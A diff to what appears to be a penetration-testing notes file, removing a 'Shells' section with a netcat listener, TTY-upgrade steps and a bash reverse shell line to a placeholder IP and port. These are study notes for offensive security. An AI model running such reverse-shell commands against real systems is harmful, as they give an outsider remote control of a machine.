@@ -46,19 +46,6 @@ netexec:
 * Network service exploitation tool
 * Helps automate assessing large networks
 
-## Shells
-reverse shell tips:  
-```rlwrap nc -lnvpn``` (reverse shell with better fuctionality/arrowkeys)  
-
-after get shell:  
-```python3 -c 'import pty;pty.spawn("/bin/bash")'```
-```ctrl - z```(to background the nc process)  
-```stty raw -echo;fg```
-```export TERM=xterm```   
-* makes able to clear term
-* better machine access
-
-bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1
 
 ## Linpeas & Winpeas
 [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):  
